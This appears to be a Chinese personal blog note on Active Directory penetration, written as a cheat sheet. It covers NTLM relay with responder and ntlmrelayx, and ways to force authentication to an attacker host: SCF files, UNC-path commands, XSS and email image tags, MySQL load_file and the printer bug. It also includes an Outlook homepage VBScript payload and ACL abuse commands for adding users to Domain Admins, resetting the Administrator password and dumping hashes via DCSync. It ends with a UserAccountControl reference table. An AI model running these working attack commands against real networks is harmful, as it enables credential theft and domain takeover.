<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
<p>impacket下的ntlmrelayx和ldaprelax都可以中继。</p>
<p>接收smb，中继到smb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t smb:&#x2F;&#x2F;10.0.2.5 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
<p>接收smb，中继到ldap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;10.0.2.5 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
<h4 id="RELAY2SMB"><a href="#RELAY2SMB" class="headerlink" title="RELAY2SMB"></a>RELAY2SMB</h4><h5 id="桌面"><a href="#桌面" class="headerlink" title="桌面"></a>桌面</h5><p>修改桌面的desktop.ini的IconResource路径为UNC路径，当在域控上打开桌面文件夹时可成功攻击</p>
<h5 id="SCF文件"><a href="#SCF文件" class="headerlink" title="SCF文件"></a>SCF文件</h5><p>新建scf文件，放到文件夹下，诱导访问这个文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command&#x3D;2</span><br><span class="line">IconFile&#x3D;\\10.0.2.4\scf\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command&#x3D;ToggleDesktop</span><br></pre></td></tr></table></figure>
<h5 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h5><p>win10的情况下，修改用户的头像为UNC地址</p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>以下是可以携带UNC的命令。都可以命令执行了，还需要relay吗？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; net.exe use \hostshare </span><br><span class="line">&gt; attrib.exe \hostshare  </span><br><span class="line">&gt; bcdboot.exe \hostshare  </span><br><span class="line">&gt; bdeunlock.exe \hostshare  </span><br><span class="line">&gt; cacls.exe \hostshare  </span><br><span class="line">&gt; certreq.exe \hostshare #(noisy, pops an error dialog) </span><br><span class="line">&gt; certutil.exe \hostshare  </span><br><span class="line">&gt; cipher.exe \hostshare  </span><br><span class="line">&gt; ClipUp.exe -l \hostshare  </span><br><span class="line">&gt; cmdl32.exe \hostshare  </span><br><span class="line">&gt; cmstp.exe &#x2F;s \hostshare  </span><br><span class="line">&gt; colorcpl.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; comp.exe &#x2F;N&#x3D;0 \hostshare \hostshare  </span><br><span class="line">&gt; compact.exe \hostshare  </span><br><span class="line">&gt; control.exe \hostshare  </span><br><span class="line">&gt; convertvhd.exe -source \hostshare -destination \hostshare </span><br><span class="line">&gt; Defrag.exe \hostshare  </span><br><span class="line">&gt; diskperf.exe \hostshare  </span><br><span class="line">&gt; dispdiag.exe -out \hostshare  </span><br><span class="line">&gt; doskey.exe &#x2F;MACROFILE&#x3D;\hostshare  </span><br><span class="line">&gt; esentutl.exe &#x2F;k \hostshare  </span><br><span class="line">&gt; expand.exe \hostshare  </span><br><span class="line">&gt; extrac32.exe \hostshare  </span><br><span class="line">&gt; FileHistory.exe \hostshare #(noisy, pops a gui)  </span><br><span class="line">&gt; findstr.exe * \hostshare  </span><br><span class="line">&gt; fontview.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; fvenotify.exe \hostshare #(noisy, pops an access denied error)  </span><br><span class="line">&gt; FXSCOVER.exe \hostshare #(noisy, pops GUI)  </span><br><span class="line">&gt; hwrcomp.exe -check \hostshare  </span><br><span class="line">&gt; hwrreg.exe \hostshare  </span><br><span class="line">&gt; icacls.exe \hostshare   </span><br><span class="line">&gt; licensingdiag.exe -cab \hostshare  </span><br><span class="line">&gt; lodctr.exe \hostshare  </span><br><span class="line">&gt; lpksetup.exe &#x2F;p \hostshare &#x2F;s  </span><br><span class="line">&gt; makecab.exe \hostshare  </span><br><span class="line">&gt; msiexec.exe &#x2F;update \hostshare &#x2F;quiet  </span><br><span class="line">&gt; msinfo32.exe \hostshare #(noisy, pops a &quot;cannot open&quot; dialog)  </span><br><span class="line">&gt; mspaint.exe \hostshare #(noisy, invalid path to png error) </span><br><span class="line">&gt; msra.exe &#x2F;openfile \hostshare #(noisy, error)  </span><br><span class="line">&gt; mstsc.exe \hostshare #(noisy, error)  </span><br><span class="line">&gt; netcfg.exe -l \hostshare -c p -i foo</span><br></pre></td></tr></table></figure>
<h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p>适用于IE和EDGE，还可以结合NBNS投毒利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;\\172.16.100.1\xss&quot;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h5><p>同XSS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;\\172.16.100.1\outlook&quot;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><p>需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;\\\\172.16.100.1\\mysql&#39;);</span><br></pre></td></tr></table></figure>
<h5 id="NBNS和LLMNR"><a href="#NBNS和LLMNR" class="headerlink" title="NBNS和LLMNR"></a>NBNS和LLMNR</h5><p>滥用MachineAccountQuota属性，添加NS解析条目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.0.2.4</span><br></pre></td></tr></table></figure>
<h5 id="XXE-amp-SSRF"><a href="#XXE-amp-SSRF" class="headerlink" title="XXE&amp;SSRF"></a>XXE&amp;SSRF</h5><p>SSRF使用file协议，XXE xml文件使用UNC路径或http协议。</p>
<p>配合NBNS可以直接利用http协议</p>
<h5 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h5><p>本地测试printerbug.py的时候，发现开了Print Spooler服务不行，还需要设置一个共享的打印机。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python printerbug.py exp.com&#x2F;cs@10.0.2.5 10.0.2.4</span><br><span class="line">SpoolSample.exe 目标 回连</span><br></pre></td></tr></table></figure>
<h4 id="RELAY2EWS"><a href="#RELAY2EWS" class="headerlink" title="RELAY2EWS"></a>RELAY2EWS</h4><p><a href="https://github.com/Arno0x/NtlmRelayToEWS">https://github.com/Arno0x/NtlmRelayToEWS</a></p>
<p>homepage</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Language&quot; content&#x3D;&quot;en-us&quot;&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;windows-1252&quot;&gt;</span><br><span class="line">&lt;title&gt;Outlook&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script id&#x3D;clientEventHandlersVBS language&#x3D;vbscript&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Sub window_onload()</span><br><span class="line">     Set Application &#x3D; ViewCtl1.OutlookApplication</span><br><span class="line">     Set cmd &#x3D; Application.CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">     cmd.Run(&quot;calc&quot;)</span><br><span class="line"> End Sub</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;object classid&#x3D;&quot;clsid:0006F063-0000-0000-C000-000000000046&quot; id&#x3D;&quot;ViewCtl1&quot; data&#x3D;&quot;&quot; width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot;&gt;&lt;&#x2F;object&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h4 id="RELAY2LDAP"><a href="#RELAY2LDAP" class="headerlink" title="RELAY2LDAP"></a>RELAY2LDAP</h4><p>高权限用户<br>如果NTLM发起用户在以下用户组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enterprise admins</span><br><span class="line">Domain admins</span><br><span class="line">Built-in Administrators</span><br><span class="line">Backup operators</span><br><span class="line">Account operators</span><br></pre></td></tr></table></figure>
<p>那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管</p>
<p>CVE-2019-1040</p>
<h3 id="ACL利用"><a href="#ACL利用" class="headerlink" title="ACL利用"></a>ACL利用</h3><p>这类暂时还不太能理解，怎么组织命令查询有这些权限的呢？</p>
<p>个人感觉这个ACL利用只是对协议利用的原理进行了描述。</p>
<h4 id="member"><a href="#member" class="headerlink" title="member"></a>member</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bf9679c0-0de6-11d0-a285-00aa003049e2</span><br></pre></td></tr></table></figure>
<p>可以将任意用户，组或计算机添加到目标组<br>将任意用户加入domain admins组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind -users -rb CN&#x3D;cs -dsq|admod -users -rb CN&#x3D;&quot;Domain Admins&quot; -stdinadd member</span><br></pre></td></tr></table></figure>
<h4 id="servicePrincipalName"><a href="#servicePrincipalName" class="headerlink" title="servicePrincipalName"></a>servicePrincipalName</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">28630EBB-41D5-11D1-A9C1-0000F80367C1</span><br></pre></td></tr></table></figure>
<p>如果对一个对象有写入spn的权限，那么就可以对这个对象进行kerberosting了，如果密码强度不强的话，有机会获取到密码。</p>
<h4 id="GPC-File-Sys-Path"><a href="#GPC-File-Sys-Path" class="headerlink" title="GPC-File-Sys-Path"></a>GPC-File-Sys-Path</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f30e3bc1-9ff0-11d1-b603-0000f80367c1</span><br></pre></td></tr></table></figure>
<h4 id="User-Force-Change-Password"><a href="#User-Force-Change-Password" class="headerlink" title="User-Force-Change-Password"></a>User-Force-Change-Password</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0299570-246d-11d0-a768-00aa006e0529</span><br></pre></td></tr></table></figure>
<p>可以在不知道当前目标用户的密码的情况下更改目标用户的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admod  -b CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;local unicodepwd::123!@#qazwsx -optenc</span><br></pre></td></tr></table></figure>
<h4 id="Dcsync"><a href="#Dcsync" class="headerlink" title="Dcsync"></a>Dcsync</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DS-Replication-Get-Changes</span><br><span class="line">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line"></span><br><span class="line">DS-Replication-Get-Changes-All</span><br><span class="line">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br></pre></td></tr></table></figure>
<p>对域对象具有这两个扩展权限的用户具备dcsync 权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python secretsdump.py exp.com&#x2F;cs:123456@dc.exp.com -dc-ip 10.0.2.254 -just-dc-user administrator</span><br></pre></td></tr></table></figure>
<h4 id="WriteDacl"><a href="#WriteDacl" class="headerlink" title="WriteDacl"></a>WriteDacl</h4><p>将新ACE写入目标对象的DACL的功能。</p>
<p>例如，攻击者可以向目标对象DACL写入新的ACE，从而使攻击者可以“完全控制”目标对象直接dcsync</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><h2 id="UserAccountControl值参考表"><a href="#UserAccountControl值参考表" class="headerlink" title="UserAccountControl值参考表"></a>UserAccountControl值参考表</h2><p>来源<a href="http://woshub.com/decoding-ad-useraccountcontrol-value/">http://woshub.com/decoding-ad-useraccountcontrol-value/</a></p>
<p>自己翻译的，可能不太对</p>
<table>
<thead>
<tr>
<th align="center">SCRIPT</th>
<th>1</th>
<th>运行登录脚本</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ACCOUNTDISABLE</td>
<td>2</td>
<td>账号已禁用</td>
</tr>
<tr>
<td align="center">HOMEDIR_REQUIRED</td>
<td>8</td>
<td>依赖家目录</td>
</tr>
<tr>
<td align="center">LOCKOUT</td>
<td>16</td>
<td>账户已锁定</td>
</tr>
<tr>
<td align="center">PASSWD_NOTREQD</td>
<td>32</td>
<td>不需密码</td>
</tr>
<tr>
<td align="center">PASSWD_CANT_CHANGE</td>
<td>64</td>
<td>用户不能更改密码</td>
</tr>
<tr>
<td align="center">ENCRYPTED_TEXT_PWD_ALLOWED</td>
<td>128</td>
<td>使用可逆加密存储密码</td>
</tr>
<tr>
<td align="center">TEMP_DUPLICATE_ACCOUNT</td>
<td>256</td>
<td>用户的帐户，其主要帐户在另一个域中</td>
</tr>
<tr>
<td align="center">NORMAL_ACCOUNT</td>
<td>512</td>
<td>默认帐户，典型的活动帐户</td>
</tr>
<tr>
<td align="center">INTERDOMAIN_TRUST_ACCOUNT</td>
<td>2048</td>
<td>域间信任</td>
</tr>
<tr>
<td align="center">WORKSTATION_TRUST_ACCOUNT</td>
<td>4096</td>
<td>工作组信任</td>
</tr>
<tr>
<td align="center">SERVER_TRUST_ACCOUNT</td>
<td>8192</td>
<td>服务器信任</td>
</tr>
<tr>
<td align="center">DONT_EXPIRE_PASSWORD</td>
<td>65536</td>
<td>密码未过期的用户帐户</td>
</tr>
<tr>
<td align="center">MNS_LOGON_ACCOUNT</td>
<td>131072</td>
<td>要登录网络，用户需要智能卡</td>
</tr>
<tr>
<td align="center">SMARTCARD_REQUIRED</td>
<td>262144</td>
<td>需要智能卡</td>
</tr>
<tr>
<td align="center">TRUSTED_FOR_DELEGATION</td>
<td>524288</td>
<td>非约束委派</td>
</tr>
<tr>
<td align="center">NOT_DELEGATED</td>
<td>1048576</td>
<td></td>
</tr>
<tr>
<td align="center">USE_DES_KEY_ONLY</td>
<td>2097152</td>
<td>仅使用DES密码</td>
</tr>
<tr>
<td align="center">DONT_REQ_PREAUTH</td>
<td>4194304</td>
<td>不需要Kerberos预身份验证</td>
</tr>
<tr>
<td align="center">PASSWORD_EXPIRED</td>
<td>8388608</td>
<td>用户密码已过期</td>
</tr>
<tr>
<td align="center">TRUSTED_TO_AUTH_FOR_DELEGATION</td>
<td>16777216</td>
<td>约束委派</td>
</tr>
<tr>
<td align="center">PARTIAL_SECRETS_ACCOUNT</td>
<td>67108864</td>
<td>受保护的账户</td>
</tr>
</tbody></table>
<p>后续再补充补充。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
</search>
